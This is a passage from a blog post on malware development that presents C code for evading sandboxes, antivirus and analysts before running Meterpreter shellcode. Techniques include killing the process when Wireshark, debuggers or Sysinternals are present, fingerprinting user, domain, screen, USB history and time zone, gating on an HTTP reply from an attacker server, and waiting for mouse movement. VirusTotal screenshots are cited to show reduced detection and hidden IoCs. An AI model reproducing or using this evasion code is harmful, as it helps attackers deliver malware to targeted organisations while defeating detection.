<span class="n">HANDLE</span> <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">WCHAR</span> <span class="n">processName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="n">Process32FirstW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processEntry</span><span class="p">))</span>
<span class="p">{</span>
	<span class="k">do</span>
	<span class="p">{</span>
		<span class="n">StringCchCopyW</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">,</span> <span class="n">processEntry</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
		<span class="n">CharUpperW</span><span class="p">(</span><span class="n">processName</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="s">L"WIRESHARK.EXE"</span><span class="p">))</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Process32NextW</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processEntry</span><span class="p">));</span>
<span class="p">}</span>

<span class="n">wprintf_s</span><span class="p">(</span><span class="s">L"Now hacking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="loaded-libraries">Loaded libraries</h4>

<p>Just like with processes, we can enumerate modules loaded in each process’ address space and check for unwanted names:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">runningProcessesIDs</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="n">DWORD</span> <span class="n">runningProcessesBytes</span><span class="p">;</span>
<span class="n">EnumProcesses</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">runningProcessesIDs</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">runningProcessesBytes</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">runningProcessesBytes</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_QUERY_INFORMATION</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">runningProcessesIDs</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hProcess</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
	<span class="n">HMODULE</span> <span class="n">processModules</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
	<span class="n">DWORD</span> <span class="n">processModulesBytes</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">EnumProcessModules</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">processModules</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">processModules</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">processModulesBytes</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">processModulesBytes</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HMODULE</span><span class="p">);</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">WCHAR</span> <span class="n">moduleName</span><span class="p">[</span><span class="n">MAX_PATH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
		<span class="n">GetModuleFileNameExW</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">processModules</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">moduleName</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
		<span class="n">CharUpperW</span><span class="p">(</span><span class="n">moduleName</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">moduleName</span><span class="p">,</span> <span class="s">L"DBGHELP.DLL"</span><span class="p">))</span> <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="n">wprintf_s</span><span class="p">(</span><span class="s">L"Now hacking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="windows-names">Windows names</h4>

<p>Let’s also check window names and compare them with names indicating the presence of common malware analysis tools:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">CALLBACK</span> <span class="nf">EnumWindowsProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hWindow</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">parameter</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">WCHAR</span> <span class="n">windowTitle</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
	<span class="n">GetWindowTextW</span><span class="p">(</span><span class="n">hWindow</span><span class="p">,</span> <span class="n">windowTitle</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">windowTitle</span><span class="p">));</span>
	<span class="n">CharUpperW</span><span class="p">(</span><span class="n">windowTitle</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">windowTitle</span><span class="p">,</span> <span class="s">L"SYSINTERNALS"</span><span class="p">))</span> <span class="o">*</span><span class="p">(</span><span class="n">PBOOL</span><span class="p">)</span><span class="n">parameter</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">bool</span> <span class="n">debugged</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="n">EnumWindows</span><span class="p">(</span><span class="n">EnumWindowsProc</span><span class="p">,</span> <span class="p">(</span><span class="n">LPARAM</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">debugged</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">debugged</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

	<span class="n">wprintf_s</span><span class="p">(</span><span class="s">L"Now hacking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="user-computer-and-domain-names">User, computer and domain names</h3>
<p>Both sandboxes and analysts usuall use computer and user names which 
are not likely to be encountered on a typical workstation, like <code class="language-plaintext highlighter-rouge">Admin</code>, <code class="language-plaintext highlighter-rouge">Administrator</code>, <code class="language-plaintext highlighter-rouge">ADMIN-PC</code> etc. Also, default machine names following the pattern <code class="language-plaintext highlighter-rouge">DESKTOP-[0-9A-Z]{7}</code>
 (or other similar patterns with random characters) are rarely present 
in corporate environments. We can compare these names with known 
character strings:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//check computer name</span>
<span class="n">DWORD</span> <span class="n">computerNameLength</span> <span class="o">=</span> <span class="n">MAX_COMPUTERNAME_LENGTH</span><span class="p">;</span>
<span class="kt">wchar_t</span> <span class="n">computerName</span><span class="p">[</span><span class="n">MAX_COMPUTERNAME_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="n">GetComputerNameW</span><span class="p">(</span><span class="n">computerName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">computerNameLength</span><span class="p">);</span>
<span class="n">CharUpperW</span><span class="p">(</span><span class="n">computerName</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">computerName</span><span class="p">,</span> <span class="s">L"DESKTOP-"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

<span class="c1">//check user name</span>
<span class="n">DWORD</span> <span class="n">userNameLength</span> <span class="o">=</span> <span class="n">UNLEN</span><span class="p">;</span>
<span class="kt">wchar_t</span> <span class="n">userName</span><span class="p">[</span><span class="n">UNLEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="n">GetUserNameW</span><span class="p">(</span><span class="n">userName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">userNameLength</span><span class="p">);</span>
<span class="n">CharUpperW</span><span class="p">(</span><span class="n">userName</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">userName</span><span class="p">,</span> <span class="s">L"ADMIN"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Since we are usually targeting corporate environments, we can assume 
that the user’s computer is a member of a domain. Let’s check domain 
join status of the machine:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PWSTR</span> <span class="n">domainName</span><span class="p">;</span>
<span class="n">NETSETUP_JOIN_STATUS</span> <span class="n">status</span><span class="p">;</span>
<span class="n">NetGetJoinInformation</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">domainName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">NetSetupDomainName</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="screen-resolution">Screen resolution</h3>
<p>Virtualized environments rarely use multiple monitors (especially 
sandboxes). Virtual displays may also have non-typical screen sizes 
(especially when fitted to the host screen but not in fullscreen mode - 
mind the hypervisor window with bars and tabs).</p>

<p>This code sample is a bit more complicated. First we check if the 
primary display has low resolution. If this check is passed, we 
enumerate all displays. <code class="language-plaintext highlighter-rouge">EnumDisplayMonitors</code>
 function requires a user-defined callback function which it calls for 
every monitor enumerated providing a handle to the monitor as a 
parameter. The callback is defined to check every monitor resolution (if
 it’s standard or not) and provide results to a common variable. If any 
monitor has uncommon width or height, the application decides that it’s 
being executed in a virtualized environment.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="n">CALLBACK</span> <span class="nf">MyCallback</span><span class="p">(</span><span class="n">HMONITOR</span> <span class="n">hMonitor</span><span class="p">,</span> <span class="n">HDC</span> <span class="n">hdcMonitor</span><span class="p">,</span> <span class="n">LPRECT</span> <span class="n">lpRect</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">MONITORINFO</span> <span class="n">monitorInfo</span><span class="p">;</span>
	<span class="n">monitorInfo</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MONITORINFO</span><span class="p">);</span>
	<span class="n">GetMonitorInfoW</span><span class="p">(</span><span class="n">hMonitor</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">monitorInfo</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">xResolution</span> <span class="o">=</span> <span class="n">monitorInfo</span><span class="p">.</span><span class="n">rcMonitor</span><span class="p">.</span><span class="n">right</span> <span class="o">-</span> <span class="n">monitorInfo</span><span class="p">.</span><span class="n">rcMonitor</span><span class="p">.</span><span class="n">left</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">yResolution</span> <span class="o">=</span> <span class="n">monitorInfo</span><span class="p">.</span><span class="n">rcMonitor</span><span class="p">.</span><span class="n">top</span> <span class="o">-</span> <span class="n">monitorInfo</span><span class="p">.</span><span class="n">rcMonitor</span><span class="p">.</span><span class="n">bottom</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">xResolution</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">xResolution</span> <span class="o">=</span> <span class="o">-</span><span class="n">xResolution</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">yResolution</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">yResolution</span> <span class="o">=</span> <span class="o">-</span><span class="n">yResolution</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">xResolution</span> <span class="o">!=</span> <span class="mi">1920</span> <span class="o">&amp;&amp;</span> <span class="n">xResolution</span> <span class="o">!=</span> <span class="mi">2560</span> <span class="o">&amp;&amp;</span> <span class="n">xResolution</span> <span class="o">!=</span> <span class="mi">1440</span><span class="p">)</span>
		<span class="o">||</span> <span class="p">(</span><span class="n">yResolution</span> <span class="o">!=</span> <span class="mi">1080</span> <span class="o">&amp;&amp;</span> <span class="n">yResolution</span> <span class="o">!=</span> <span class="mi">1200</span> <span class="o">&amp;&amp;</span> <span class="n">yResolution</span> <span class="o">!=</span> <span class="mi">1600</span> <span class="o">&amp;&amp;</span> <span class="n">yResolution</span> <span class="o">!=</span> <span class="mi">900</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="o">*</span><span class="p">((</span><span class="n">BOOL</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">)</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">MONITORENUMPROC</span> <span class="n">pMyCallback</span> <span class="o">=</span> <span class="p">(</span><span class="n">MONITORENUMPROC</span><span class="p">)</span><span class="n">MyCallback</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">xResolution</span> <span class="o">=</span> <span class="n">GetSystemMetrics</span><span class="p">(</span><span class="n">SM_CXSCREEN</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">yResolution</span> <span class="o">=</span> <span class="n">GetSystemMetrics</span><span class="p">(</span><span class="n">SM_CYSCREEN</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">xResolution</span> <span class="o">&lt;</span> <span class="mi">1000</span> <span class="o">&amp;&amp;</span> <span class="n">yResolution</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">)</span>  <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

	<span class="kt">int</span> <span class="n">numberOfMonitors</span> <span class="o">=</span> <span class="n">GetSystemMetrics</span><span class="p">(</span><span class="n">SM_CMONITORS</span><span class="p">);</span>
	<span class="n">bool</span> <span class="n">sandbox</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="n">EnumDisplayMonitors</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pMyCallback</span><span class="p">,</span> <span class="p">(</span><span class="n">LPARAM</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">sandbox</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sandbox</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

	<span class="n">wprintf_s</span><span class="p">(</span><span class="s">L"Now hacking...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This allowed to lower the detection rate a little bit (the file was 
flagged as “unsafe” instead of “Meterpreter”) and made it impossible to 
fully analyze the executable (IP IoCs were not extracted):</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_monitor_check.png" alt="VT monitor check"></p>

<h3 id="seasoned-systems">“Seasoned” systems</h3>
<p>Virtual environments often look like fresh Windows installation. They
 may lack some artifacts that appear over time on a typical workstation.
 A good example is number of USB storage devices mounted in the systems 
which is stored in the registry. We can check if a USB storage was ever 
mounted on the system:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HKEY</span> <span class="n">hKey</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">mountedUSBDevicesCount</span><span class="p">;</span>
<span class="n">RegOpenKeyEx</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="s">L"SYSTEM</span><span class="se">\\</span><span class="s">ControlSet001</span><span class="se">\\</span><span class="s">Enum</span><span class="se">\\</span><span class="s">USBSTOR"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">KEY_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hKey</span><span class="p">);</span>
<span class="n">RegQueryInfoKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mountedUSBDevicesCount</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">mountedUSBDevicesCount</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>This check also allowed to lower the detection rate (the file was 
flagged as “unsafe” by Cylance) and thwarted network IoCs analysis.</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_USB_check.png" alt="VT USB check"></p>

<h3 id="time-zone">Time zone</h3>
<p>When we target specific users or ogranization, we can prevent our 
code from being executed in an environment having the time zone set to a
 different value than our target. Make sure the system time zone name is
 not dependent on the system language.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SetThreadLocale</span><span class="p">(</span><span class="n">MAKELCID</span><span class="p">(</span><span class="n">MAKELANGID</span><span class="p">(</span><span class="n">LANG_ENGLISH</span><span class="p">,</span> <span class="n">SUBLANG_ENGLISH_US</span><span class="p">),</span> <span class="n">SORT_DEFAULT</span><span class="p">));</span>
<span class="n">DYNAMIC_TIME_ZONE_INFORMATION</span> <span class="n">dynamicTimeZoneInfo</span><span class="p">;</span>
<span class="n">GetDynamicTimeZoneInformation</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dynamicTimeZoneInfo</span><span class="p">);</span>
<span class="kt">wchar_t</span> <span class="n">timeZoneName</span><span class="p">[</span><span class="mi">128</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
<span class="n">StringCchCopyW</span><span class="p">(</span><span class="n">timeZoneName</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">dynamicTimeZoneInfo</span><span class="p">.</span><span class="n">TimeZoneKeyName</span><span class="p">);</span>
<span class="n">CharUpperW</span><span class="p">(</span><span class="n">timeZoneName</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">wcsstr</span><span class="p">(</span><span class="n">timeZoneName</span><span class="p">,</span> <span class="s">L"CENTRAL EUROPEAN STANDARD TIME"</span><span class="p">))</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Again, lower detection rate and no IoCs:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_time_check.png" alt="VT time check"></p>

<h2 id="detecting-automated-analysis">Detecting automated analysis</h2>
<p>There are several evasions specific to automated sandboxes. They are 
based on particularly limited resources available in sandbox 
environments. Such execution environments often lack actual Internet 
connection and user interaction.</p>

<h3 id="internet-connection">Internet connection</h3>
<p>Sandboxes usually do not provide Internet connection however they may
 simulate valid responses from remote servers. Let’s see when we make 
shellcode execution dependent on the result of a HTTP request:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="s">L"Mozilla 5.0"</span><span class="p">,</span> <span class="n">WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hConnection</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span> <span class="s">L"my.domain.or.ip"</span><span class="p">,</span> <span class="n">INTERNET_DEFAULT_HTTP_PORT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnection</span><span class="p">,</span> <span class="s">L"GET"</span><span class="p">,</span> <span class="s">L"test"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">BOOL</span> <span class="n">status</span> <span class="o">=</span> <span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">status</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Analysis results were slightly better (for us) than without HTTP connection checking. IP IoCs were not extracted by VT sandbox.</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_http_check.png" alt="VT http check"></p>

<p>Single HTTP request was received on the target server. This means that some systems extend the analysis to the “real world”.</p>

<p>We can further develop this evasion method and execute the shellcode only after receiving a specific response:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HINTERNET</span> <span class="n">hSession</span> <span class="o">=</span> <span class="n">WinHttpOpen</span><span class="p">(</span><span class="s">L"Mozilla 5.0"</span><span class="p">,</span> <span class="n">WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span> <span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hConnection</span> <span class="o">=</span> <span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span> <span class="s">L"my.domain.or.ip"</span><span class="p">,</span> <span class="n">INTERNET_DEFAULT_HTTP_PORT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">HINTERNET</span> <span class="n">hRequest</span> <span class="o">=</span> <span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnection</span><span class="p">,</span> <span class="s">L"GET"</span><span class="p">,</span> <span class="s">L"test"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span> <span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">WinHttpSendRequest</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">WINHTTP_NO_ADDITIONAL_HEADERS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WINHTTP_NO_REQUEST_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">WinHttpReceiveResponse</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">DWORD</span> <span class="n">responseLength</span><span class="p">;</span>
<span class="n">WinHttpQueryDataAvailable</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">responseLength</span><span class="p">);</span>
<span class="n">PVOID</span> <span class="n">response</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">responseLength</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">WinHttpReadData</span><span class="p">(</span><span class="n">hRequest</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">responseLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">responseLength</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">atoi</span><span class="p">((</span><span class="n">PSTR</span><span class="p">)</span><span class="n">response</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1337</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p>Results (no IP IoCs):</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_http_check2.png" alt="VT http check2"></p>

<p>This technique can leverage HTTPS, DNS and other network requests.</p>

<h3 id="user-interaction">User interaction</h3>
<p>Only selected sandboxes can simulate user interaction (like clicking 
on a pop-up window). We can issue a message box before executing the 
malicious code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MessageBoxW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">L"Just click OK"</span><span class="p">,</span> <span class="s">L"Hello"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/msgbox1.png" alt="msgbox 1"></p>

<p>Actually <code class="language-plaintext highlighter-rouge">MessageBox</code>
 function returns a value based on what button was clicked. We can use 
additional parameters to create more buttons and continue execution only
 when specific buttons are clicked. However this assumes that a user 
will actually click the proper button. Also, we may not want a user to 
see any message when our code is executing.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">response</span> <span class="o">=</span> <span class="n">MessageBoxW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">L"Do you want to restart your computer now?"</span><span class="p">,</span> <span class="s">L"Restart required"</span><span class="p">,</span> <span class="n">MB_YESNOCANCEL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">response</span> <span class="o">==</span> <span class="n">IDYES</span><span class="p">)</span> <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</code></pre></div></div>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/msgbox2.png" alt="msgbox 2"></p>

<p>This bypasses some AVs however MS Defender is still able to identify the “Meterpreter trojan”:</p>

<p><img src="Malware%20development%20part%202%20%E2%80%93%200xPat%20blog%20%E2%80%93%20Red_purple%20teamer_files/VT_msgbox_check.png" alt="VT msgbox check"></p>

<p>Now let’s require specific ammount of user interaction - we can wait 
until the user moves mouse for a specific distance. This may take a 
minute or two for a typical user and even longer for a sandbox 
(hopefully exceeding allocated time frame for the emulation):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POINT</span> <span class="n">currentMousePosition</span><span class="p">;</span>
<span class="n">POINT</span> <span class="n">previousMousePosition</span><span class="p">;</span>
<span class="n">GetCursorPos</span><span class="p">(</span><span class="o">&amp;</span><span class="n">previousMousePosition</span><span class="p">);</span>
<span class="kt">double</span> <span class="n">mouseDistance</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">GetCursorPos</span><span class="p">(</span><span class="o">&amp;</span><span class="n">currentMousePosition</span><span class="p">);</span>
